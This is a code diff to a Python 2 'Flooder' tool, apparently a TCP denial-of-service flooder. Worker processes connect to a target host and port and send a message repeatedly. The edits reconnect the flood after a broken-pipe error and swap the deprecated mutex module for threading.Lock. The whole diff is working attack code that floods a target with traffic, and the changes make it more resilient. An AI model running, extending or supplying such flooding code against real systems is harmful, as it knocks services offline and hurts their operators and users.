@@ -1,4 +1,4 @@
-import socket, threading, random, time, os, mutex
+import socket, threading, random, time, os
 from multiprocessing import Process
 from Events import *
 from main import *
@@ -30,29 +30,31 @@ class TCPWorkerThread(Process):
 
     def run(self):
         while self.running:
-            try:
-                self.socket.connect((self.flooder.host, self.flooder.port))
-                print "thread", self.id, "connected"
+            while self.running:
+                try:
+                    self.socket.connect((self.flooder.host, self.flooder.port))
+                    print "thread", self.id, "connected"
+                    break
+                except Exception as e:
+                    print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
+                    time.sleep(1)
+                    continue
                 break
-            except Exception as e:
-                print "Couldn't connect:", e.args, self.flooder.host, self.flooder.port
-                time.sleep(1)
-                continue
-            break
 
 
-        while self.running:
-            try:
-                self.flooder.increaseFlood()
-                self.socket.send(self.message)
-                print "thread", self.id, "count", self.floodCount
-                if self.flooder.wait != None and self.flooder.wait != False:
-                    print "thread", self.id, "sleeping for", self.flooder.wait
-                    time.sleep(self.flooder.wait)
-            except Exception as e:
-                print "Couldn't send message on thread", self.id, "because", e.args
-                time.sleep(0.1)
-                pass
+            while self.running:
+                try:
+                    #self.flooder.increaseFlood()
+                    self.socket.send(self.message)
+                    if self.flooder.wait != None and self.flooder.wait != False:
+                        print "thread", self.id, "sleeping for", self.flooder.wait
+                        time.sleep(self.flooder.wait)
+                except Exception as e:
+                    if e.args[0] == 32:
+                        break
+                    print "Couldn't send message on thread", self.id, "because", e.args
+                    time.sleep(0.1)
+                    pass
 
 class Flooder:
 
@@ -70,7 +72,7 @@ class Flooder:
         self.random = random
         self.threadId = 0
         self.__floodCount = 0
-        self.__floodMutex = mutex.mutex()
+        self.__floodLock = threading.Lock()
 
         if method == TCP_METHOD:
             if message == None and random == False:
@@ -101,6 +103,6 @@ class Flooder:
         return self.__floodCount
 
     def increaseFlood(self):
-        self.__floodMutex.lock()
+        self.__floodLock.acquire()
         self.__floodCount += 1
-        self.__floodMutex.unlock()
+        self.__floodLock.release()
